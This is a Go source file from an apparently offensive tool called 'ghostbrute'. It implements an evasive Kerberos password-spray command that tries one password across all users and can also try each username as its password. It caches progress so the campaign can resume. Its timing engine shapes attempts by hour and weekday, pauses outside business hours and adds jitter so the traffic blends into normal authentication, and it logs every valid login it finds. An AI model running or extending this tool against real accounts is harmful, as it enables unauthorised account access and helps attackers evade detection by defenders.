package cmd

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gcache "github.com/s1gf/ghostbrute/cache"
	"github.com/s1gf/ghostbrute/timing"
	"github.com/s1gf/ghostbrute/util"

	"github.com/spf13/cobra"
)

var (
	timingConfigFile string
	cacheFile        string
	maxPerUser       int
)

var sprayCampaignCmd = &cobra.Command{
	Use:   "spraycampaign [flags] <username_wordlist> <password_wordlist>",
	Short: "Evasive password spray campaign with traffic-shaped timing",
	Long: `Performs a password spray campaign using a list of passwords against a list of users.
Sprays one password at a time across all users, then waits based on the timing engine
before moving to the next password. Supports cache/resume and traffic-shaped timing.

The timing engine shapes request volume by hour-of-day and day-of-week to blend into
normal authentication traffic. Use --timing-config to provide a JSON timing profile.

Example timing config (timing.json):
{
  "utc_offset": 2,
  "base_delay": 5.0,
  "daily_speedup": 1.25,
  "initial_speed": 0.5,
  "jitter_min": 1.0,
  "jitter_max": 3.0,
  "hours_factor": {"8": 1.0, "9": 1.0, "10": 0.8, ...},
  "days_factor": {"mon": 1.0, "sat": 0.1, ...}
}`,
	Args:   cobra.MinimumNArgs(1),
	PreRun: setupSession,
	Run:    sprayCampaign,
}

func init() {
	sprayCampaignCmd.Flags().StringVar(&timingConfigFile, "timing-config", "", "JSON timing config file for traffic-shaped delays")
	sprayCampaignCmd.Flags().StringVar(&cacheFile, "cache-file", "", "Cache file for resume support (default: ghostbrute.cache)")
	sprayCampaignCmd.Flags().IntVar(&maxPerUser, "max-per-user", 0, "Max password attempts per user per campaign (0 = unlimited)")
	sprayCampaignCmd.Flags().BoolVar(&userAsPass, "user-as-pass", false, "Also try each username as its own password")
	rootCmd.AddCommand(sprayCampaignCmd)
}

func interruptibleSleep(d time.Duration, stop <-chan struct{}) bool {
	select {
	case <-stop:
		return true
	case <-time.After(d):
		return false
	}
}

func sprayCampaign(cmd *cobra.Command, args []string) {
	usernamelist := args[0]

	if !userAsPass && len(args) < 2 {
		logger.Log.Error("You must specify a password wordlist, or use --user-as-pass")
		os.Exit(1)
	}

	var timingEngine *timing.Engine
	if timingConfigFile != "" {
		cfg, err := timing.LoadConfig(timingConfigFile)
		if err != nil {
			logger.Log.Errorf("Failed to load timing config: %v", err)
			os.Exit(1)
		}
		timingEngine = timing.NewEngine(cfg)
		logger.Log.Info("Timing engine loaded: traffic-shaped delays active")
		logger.Log.Infof("  %s", timingEngine.Status())
	} else {
		cfg := timing.DefaultConfig()
		timingEngine = timing.NewEngine(cfg)
		logger.Log.Info("Using default timing profile (business hours curve)")
	}

	if cacheFile == "" {
		cacheFile = "ghostbrute.cache"
	}
	sprayCache, err := gcache.New(cacheFile)
	if err != nil {
		logger.Log.Errorf("Failed to initialize cache: %v", err)
		os.Exit(1)
	}
	defer sprayCache.Close()

	resumed := sprayCache.TriedCount()
	if resumed > 0 {
		logger.Log.Infof("Resuming campaign: %d attempts already cached, skipping", resumed)
	}

	users, err := readLines(usernamelist)
	if err != nil {
		logger.Log.Errorf("Failed to read user list: %v", err)
		os.Exit(1)
	}
	logger.Log.Infof("Loaded %d users", len(users))

	var passwords []string
	if len(args) >= 2 {
		passwords, err = readLines(args[1])
		if err != nil {
			logger.Log.Errorf("Failed to read password list: %v", err)
			os.Exit(1)
		}
		logger.Log.Infof("Loaded %d passwords", len(passwords))
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	stopChan := make(chan struct{})
	go func() {
		<-sigChan
		logger.Log.Warning("\nInterrupt received - saving state and shutting down...")
		close(stopChan)
	}()

	start := time.Now()
	userAttempts := make(map[string]int)
	var mu sync.Mutex

	logger.Log.Noticef("Starting spray campaign against %d users", len(users))

	if userAsPass {
		logger.Log.Info("Phase 0: Trying username-as-password...")
		for _, rawUser := range users {
			select {
			case <-stopChan:
				goto Done
			default:
			}

			username, fmtErr := util.FormatUsername(rawUser)
			if fmtErr != nil {
				continue
			}

			if sprayCache.AlreadyTried(username, username) {
				continue
			}

			if waitForActivityWindow(timingEngine, stopChan) {
				goto Done
			}

			if interruptibleSleep(timingEngine.ComputeDelay(), stopChan) {
				goto Done
			}

			if handleAttempt(username, username, sprayCache, &mu, userAttempts, stopChan) {
				goto Done
			}
		}
	}

	for pi, pw := range passwords {
		select {
		case <-stopChan:
			goto Done
		default:
		}

		logger.Log.Noticef("=== Password %d/%d: spraying across %d users ===", pi+1, len(passwords), len(users))
		logger.Log.Infof("  Timing: %s", timingEngine.Status())

		for _, rawUser := range users {
			select {
			case <-stopChan:
				goto Done
			default:
			}

			username, fmtErr := util.FormatUsername(rawUser)
			if fmtErr != nil {
				logger.Log.Debugf("[!] %q - %v", rawUser, fmtErr.Error())
				continue
			}

			if sprayCache.AlreadyTried(username, pw) {
				continue
			}

			mu.Lock()
			if maxPerUser > 0 && userAttempts[username] >= maxPerUser {
				mu.Unlock()
				continue
			}
			mu.Unlock()

			if waitForActivityWindow(timingEngine, stopChan) {
				goto Done
			}

			if interruptibleSleep(timingEngine.ComputeDelay(), stopChan) {
				goto Done
			}

			if handleAttempt(username, pw, sprayCache, &mu, userAttempts, stopChan) {
				goto Done
			}
		}

		if pi < len(passwords)-1 {
			sweepDelay := timingEngine.ComputeDelay() * 3
			logger.Log.Infof("Password sweep complete. Waiting %v before next password...", sweepDelay.Round(time.Second))
			if interruptibleSleep(sweepDelay, stopChan) {
				goto Done
			}
		}
	}

Done:
	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Campaign finished. Tested %d logins (%d successes) in %v",
		finalCount, finalSuccess, time.Since(start).Round(time.Second))
	logger.Log.Infof("Total cached attempts: %d (successes: %d)", sprayCache.TriedCount(), sprayCache.SuccessCount())
	if cacheFile != "" {
		logger.Log.Infof("Cache saved to: %s", cacheFile)
	}
}

func waitForActivityWindow(engine *timing.Engine, stop <-chan struct{}) bool {
	if !engine.ShouldPause() {
		return false
	}
	logger.Log.Info("Off-hours detected, pausing until activity window...")
	for engine.ShouldPause() {
		if interruptibleSleep(30*time.Second, stop) {
			return true
		}
	}
	logger.Log.Info("Activity window entered, resuming...")
	return false
}

// handleAttempt returns true if the campaign should abort.
func handleAttempt(username, password string, sprayCache *gcache.SprayCache, mu *sync.Mutex, userAttempts map[string]int, stop <-chan struct{}) bool {
	success, fatal, loginErr := attemptLogin(username, password)
	errMsg := ""
	if loginErr != nil {
		errMsg = loginErr.Error()
	}
	if cacheErr := sprayCache.Record(username, password, success, errMsg); cacheErr != nil {
		logger.Log.Errorf("Cache write failed: %v", cacheErr)
	}

	mu.Lock()
	userAttempts[username]++
	mu.Unlock()

	return fatal
}

func attemptLogin(username, password string) (success bool, fatal bool, err error) {
	atomic.AddInt32(&counter, 1)
	login := fmt.Sprintf("%v@%v:%v", username, domain, password)

	if ok, loginErr := kSession.TestLogin(username, password); ok {
		atomic.AddInt32(&successes, 1)
		if loginErr != nil {
			logger.Log.Noticef("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)", login, loginErr)
		} else {
			logger.Log.Noticef("[+] VALID LOGIN:\t %s", login)
		}
		return true, false, loginErr
	} else {
		ok, errorString := kSession.HandleKerbError(loginErr)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", login, errorString)
			if kSession.SafeMode {
				logger.Log.Error("Safe mode triggered - aborting campaign")
				return false, true, fmt.Errorf("%s", errorString)
			}
			return false, true, fmt.Errorf("%s", errorString)
		}
		logger.Log.Debugf("[!] %v - %v", login, errorString)
		return false, false, fmt.Errorf("%s", errorString)
	}
}

func readLines(path string) ([]string, error) {
	var lines []string
	var scanner *bufio.Scanner

	if path == "-" {
		scanner = bufio.NewScanner(os.Stdin)
	} else {
		f, err := os.Open(path)
		if err != nil {
			return nil, err
		}
		defer f.Close()
		scanner = bufio.NewScanner(f)
	}

	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
